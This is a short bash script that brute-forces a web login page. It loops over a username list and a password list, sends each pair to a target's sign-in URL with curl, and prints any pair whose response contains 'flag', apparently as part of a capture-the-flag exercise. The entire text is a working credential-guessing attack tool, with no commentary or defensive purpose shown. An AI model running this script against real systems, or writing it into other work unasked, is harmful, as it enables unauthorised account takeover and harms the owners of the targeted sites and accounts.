#!/bin/bash

while read -r line2; do
  while read -r line3; do
    value=$(curl -s "http://$1/?page=signin&username=$line2&password=$line3&Login=Login" | grep flag)
    if [ "$value" ]; then
        echo "Success: Credentials found, Username - $line2 & Password - $line3"
    fi
  done < "$3"
done < "$2"